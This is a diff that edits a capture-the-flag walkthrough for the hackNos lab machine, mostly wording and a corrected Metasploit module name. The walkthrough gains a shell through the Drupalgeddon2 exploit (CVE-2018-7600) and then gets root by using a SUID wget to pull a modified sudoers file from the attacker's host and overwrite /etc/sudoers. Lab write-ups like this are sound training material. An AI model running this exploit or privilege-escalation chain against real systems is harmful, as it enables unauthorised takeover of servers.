@@ -227,10 +227,11 @@ Pass: Hacker@4514
 
 ### Serching Vulnerabilities
 
-After login we can find Drupal version: `7.57`.\
+After login we can find Drupal version: `7.57`\
 \
-In CVE Details ( https://www.cvedetails.com/vulnerability-list/vendor_id-1367/product_id-2387/version_id-242112/Drupal-Drupal-7.57.html ) are 7 vulnerabilities to explore.\
-We will explore the **CVE-2018-7600**. It is a Remote Code Execution (RCE) and has a Metasploit modeule **Drupalgeddon2** ( https://www.exploit-db.com/exploits/44482 ).
+In CVE Details of this Drupal version ( https://www.cvedetails.com/vulnerability-list/vendor_id-1367/product_id-2387/version_id-242112/Drupal-Drupal-7.57.html ) are 7 vulnerabilities to explore.\
+We will explore the **CVE-2018-7600**.\
+It is a Remote Code Execution (RCE) and has a Metasploit module **Drupalgeddon2** ( https://www.exploit-db.com/exploits/44482 ).
 ```
 msf6 > search drupalgeddon2
 
@@ -245,7 +246,7 @@ Matching Modules
 ### Exploiting
 
 ```
-msf6 > use exploit/unix/webapp/php_xmlrpc_eval
+msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
 
 msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.1.184
 msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set TARGETURI /drupal
@@ -344,9 +345,8 @@ www-data@hackNos:/home/james$ find / -type f -perm -u=s 2>/dev/null
 /bin/fusermount
 ```
 
-With `/usr/bin/wget` my idea is to overwrite `sudoers` file.\
-\
-First of all,on my host machine, I got an default `sudoers` file and add a full root permission for `www-data` user.
+With `/usr/bin/wget` my idea is to overwrite `/etc/sudoers` file.\
+First of all,on my host machine, I got an default `/etc/sudoers` file and add a full root permission for `www-data` user.
 ```
 www-data ALL=(ALL) NOPASSWD:ALL
 ```
@@ -392,7 +392,7 @@ $ python -m SimpleHTTPServer 8787
 Serving HTTP on 0.0.0.0 port 8787 ...
 ```
 
-In target machine we can use `/usr/bin/wget` to overwrite the original `sudoers` file:
+In target machine we can use `/usr/bin/wget` to overwrite the original `/etc/sudoers` file:
 ```
 www-data@hackNos:/$ wget http://192.168.1.189:8787/sudoers -O /etc/sudoers
 
@@ -408,7 +408,7 @@ Saving to: '/etc/sudoers'
 2021-01-24 23:07:50 (235 MB/s) - '/etc/sudoers' saved [791/791]
 ```
 
-Now the user `www-data` has full root permission without need password validation.
+Now the user `www-data` has full root permission without password validation.
 ```
 www-data@hackNos:/$ sudo bash
 root@hackNos:/#
